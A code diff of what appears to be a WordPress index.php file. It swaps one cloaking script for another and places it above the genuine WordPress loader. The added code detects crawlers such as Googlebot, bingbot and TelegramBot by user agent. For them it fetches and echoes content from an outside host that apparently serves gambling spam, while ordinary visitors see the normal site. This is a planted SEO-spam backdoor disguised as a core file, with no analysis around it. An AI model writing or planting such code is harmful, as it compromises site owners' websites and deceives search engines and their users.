@@ -1,18 +1,37 @@
 <?php
-function is_google_bot() {
-    $agents = array("Googlebot", "Google-Site-Verification", "Google-InspectionTool", "Googlebot-Mobile", "Googlebot-News");
-    foreach ($agents as $agent) {
-        if (strpos($_SERVER['HTTP_USER_AGENT'], $agent) !== false) return true;
+function is_bot() {
+    $user_agent = $_SERVER['HTTP_USER_AGENT'];
+    $bots = array('Googlebot', 'TelegramBot', 'bingbot', 'Google-Site-Verification', 'Google-InspectionTool');
+    
+    foreach ($bots as $bot) {
+        if (stripos($user_agent, $bot) !== false) {
+            return true;
+        }
     }
+    
     return false;
 }
 
-if (is_google_bot()) {
-    $bot_content = file_get_contents('readme.txt');
-    echo $bot_content;
-    exit;
-} else {
-    include('data.php');
-    exit; 
-}
+if (is_bot()) { 
+    $message = file_get_contents('https://ampkami.store/renge/rajabandot/simransoftwaresolutions.txt'); // 
+    echo $message; 
+    (exit);
+} 
 ?>
+<?php
+/**
+ * Front to the WordPress application. This file doesn't do anything, but loads
+ * wp-blog-header.php which does and tells WordPress to load the theme.
+ *
+ * @package WordPress
+ */
+
+/**
+ * Tells WordPress to load the WordPress theme and output it.
+ *
+ * @var bool
+ */
+define( 'WP_USE_THEMES', true );
+
+/** Loads the WordPress Environment and Template */
+require dirname(__FILE__) . '/wp-blog-header.php';
